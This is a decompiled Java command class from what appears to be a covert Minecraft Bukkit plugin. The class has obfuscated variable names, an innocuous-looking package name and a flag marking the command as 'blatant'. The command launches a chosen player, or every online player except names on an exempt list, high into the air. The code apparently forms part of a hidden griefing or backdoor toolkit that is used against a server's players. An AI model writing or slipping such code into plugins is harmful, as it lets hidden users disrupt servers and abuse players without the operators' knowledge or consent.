/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LaunchCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIllIIIllIIlIIIIII, String lllllllllllllIlIllIIIllIIlIIIlII, String[] lllllllllllllIlIllIIIllIIlIIIIll, Player lllllllllllllIlIllIIIllIIIllllII) {
        if (lllllllllllllIlIllIIIllIIlIIIIll.length <= 1) {
            lllllllllllllIlIllIIIllIIIllllII.sendMessage(Settings.USAGE("launch <player>"));
        } else if (lllllllllllllIlIllIIIllIIlIIIIll[1].equals("*")) {
            for (Player lllllllllllllIlIllIIIllIIlIIlIll : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIlIllIIIllIIlIIIIII.lite.contains(lllllllllllllIlIllIIIllIIlIIlIll.getName())) continue;
                lllllllllllllIlIllIIIllIIlIIlIll.setVelocity(lllllllllllllIlIllIIIllIIlIIlIll.getVelocity().setY(100));
            }
            lllllllllllllIlIllIIIllIIIllllII.sendMessage(Settings.PREFIX("Everyone was launched into the air!"));
        } else {
            Player lllllllllllllIlIllIIIllIIlIIlIIl = Bukkit.getServer().getPlayer(lllllllllllllIlIllIIIllIIlIIIIll[1]);
            if (lllllllllllllIlIllIIIllIIlIIlIIl == null) {
                lllllllllllllIlIllIIIllIIIllllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIlIllIIIllIIlIIIIll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                lllllllllllllIlIllIIIllIIlIIlIIl.setVelocity(lllllllllllllIlIllIIIllIIlIIlIIl.getVelocity().setY(100));
                lllllllllllllIlIllIIIllIIIllllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIlIllIIIllIIlIIlIIl.getName()).append(Settings.WHITE).append(" was launched into the air!"))));
            }
        }
    }

    public LaunchCommand() {
        LaunchCommand lllllllllllllIlIllIIIllIIllIlIIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

